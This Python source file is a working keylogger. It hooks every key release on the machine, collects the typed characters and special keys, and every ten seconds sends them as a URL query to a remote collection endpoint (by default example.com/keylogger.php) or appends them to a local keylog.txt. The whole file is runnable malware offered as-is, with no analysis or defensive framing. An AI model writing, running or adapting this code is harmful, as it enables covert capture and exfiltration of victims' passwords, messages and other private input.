import keyboard
import urllib.request
from threading import Timer
from datetime import datetime
import os

# Interval for sending reports (in seconds)
REPORT_INTERVAL = 10

class Keylogger:
    def __init__(self, interval, report_method="server", server_url=None):
        """
        Initializes the keylogger.
        :param interval: Time interval (seconds) for reporting captured keys.
        :param report_method: "server" to send to a remote server or "file" for local storage.
        :param server_url: URL of the server to send key logs (used if report_method="server").
        """
        self.interval = interval
        self.report_method = report_method
        self.server_url = server_url
        self.keys = ""  # Captured keystrokes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        Callback function triggered on key release.
        :param event: The keyboard event.
        """
        try:
            # Get the name of the key
            name = event.name
            if len(name) > 1:
                # Handle special keys (e.g., shift, ctrl)
                name = f"[{name.upper()}]"
            self.keys += name
        except Exception as e:
            print(f"Error in callback: {e}")

    def report(self):
        """
        Sends the report of captured keystrokes.
        """
        if self.keys:
            if self.report_method == "server" and self.server_url:
                try:
                    urllib.request.urlopen(f'{self.server_url}?key={self.keys}')
                except Exception as e:
                    print(f"Error sending to server: {e}")
            elif self.report_method == "file":
                with open("keylog.txt", "a") as file:
                    file.write(f"{self.keys}\n")
            self.start_dt = datetime.now()
        # Reset the keys
        self.keys = ""
        # Schedule the next report
        timer = Timer(interval=self.interval, function=self.report)
        timer.start()

    def start(self):
        """
        Starts the keylogger.
        """
        print("[*] Keylogger started.")
        print(f"[*] Logging keys every {self.interval} seconds.")
        if self.report_method == "server" and not self.server_url:
            print("[!] No server URL provided. Logging will fail.")
        # Set up the keyboard listener
        keyboard.on_release(callback=self.callback)
        # Start reporting
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    # Use environment variables for sensitive information (e.g., server URL)
    SERVER_URL = os.getenv("SERVER_URL", "https://example.com/keylogger.php")

    # Initialize the keylogger
    keylogger = Keylogger(interval=REPORT_INTERVAL, report_method="server", server_url=SERVER_URL)
    keylogger.start()
